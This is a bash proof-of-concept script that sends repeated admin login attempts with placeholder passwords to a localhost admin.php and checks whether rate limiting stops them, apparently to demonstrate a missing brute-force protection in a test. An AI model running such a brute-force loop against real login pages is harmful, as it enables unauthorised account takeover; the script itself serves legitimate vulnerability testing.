#!/bin/bash

# POC: Brute-Force Attack on Admin Login - No Rate Limiting
# Target: http://localhost:32768/admin.php
# Purpose: Demonstrate lack of brute-force protection

TARGET="http://localhost:32768/admin.php"
PASSWORDS=("password1" "password2" "password3" "password4" "password5")
ATTEMPT_COUNT=0
SUCCESS_COUNT=0
FAILED_COUNT=0

echo "=========================================="
echo "Brute-Force POC - Admin Login"
echo "=========================================="
echo "Target: $TARGET"
echo "Testing with ${#PASSWORDS[@]} sequential login attempts..."
echo ""

# Test rapid sequential login attempts
for password in "${PASSWORDS[@]}"; do
    ATTEMPT_COUNT=$((ATTEMPT_COUNT + 1))
    
    echo "Attempt $ATTEMPT_COUNT: Testing password '$password'"
    
    # Record start time for response timing
    START_TIME=$(date +%s%N)
    
    # Send login request
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=admin&password=$password" \
        2>&1)
    
    # Extract HTTP status code (last line)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
    
    # Extract response body (all but last line)
    BODY=$(echo "$RESPONSE" | sed '$d')
    
    # Record end time
    END_TIME=$(date +%s%N)
    
    # Calculate response time in milliseconds
    RESPONSE_TIME=$(( (END_TIME - START_TIME) / 1000000 ))
    
    echo "  HTTP Status: $HTTP_CODE"
    echo "  Response Time: ${RESPONSE_TIME}ms"
    
    # Check for rate limiting indicators
    if echo "$BODY" | grep -qi "rate\|limit\|too many\|lock\|wait\|captcha\|challenge"; then
        echo "  ⚠ Rate limiting detected"
        FAILED_COUNT=$((FAILED_COUNT + 1))
    elif [ "$HTTP_CODE" = "200" ]; then
        echo "  ✓ Request accepted immediately (NO rate limiting)"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    else
        FAILED_COUNT=$((FAILED_COUNT + 1))
    fi
    
    echo ""
    
    # Small delay between attempts (simulating attacker behavior)
    sleep 0.5
done

echo "=========================================="
echo "Results Summary"
echo "=========================================="
echo "Total Attempts: $ATTEMPT_COUNT"
echo "Requests Accepted (200 OK): $SUCCESS_COUNT"
echo "Rate Limited/Blocked: $FAILED_COUNT"
echo ""

if [ $SUCCESS_COUNT -eq $ATTEMPT_COUNT ]; then
    echo "✓ VULNERABILITY CONFIRMED:"
    echo "  All $SUCCESS_COUNT rapid login attempts were accepted without rate limiting."
    echo "  No brute-force protection mechanism detected."
    exit 0
else
    echo "✗ Some rate limiting appears to be in place."
    exit 1
fi